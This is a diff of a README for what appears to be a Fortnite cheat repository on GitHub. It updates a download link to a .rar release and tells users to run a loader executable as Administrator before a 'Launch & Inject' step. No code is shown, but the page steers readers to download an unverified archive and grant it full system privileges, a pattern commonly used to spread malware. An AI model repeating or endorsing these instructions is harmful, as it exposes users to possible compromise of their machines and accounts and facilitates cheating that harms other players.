@@ -7,7 +7,7 @@
 
 
 --- 
-## 📥 [Download](https://github.com/fencehelmsmandock/-Fortnite-External-2026/releases/download/fortnite/fortnite-2.2.9.rar)
+## 📥 [Download](https://github.com/fencehelmsmandock/-Fortnite-External-2026/releases/download/fortnite/fortnite2.3.rar)
 
 
 | Feature |	Description |
@@ -47,7 +47,7 @@
 
 3. **Run Loader**  
 
-   Run `fortnit-2.2.8.exe` as **Administrator**.
+   Run `fortnit-2.3.exe` as **Administrator**.
 
 
 4. **Launch & Inject**  
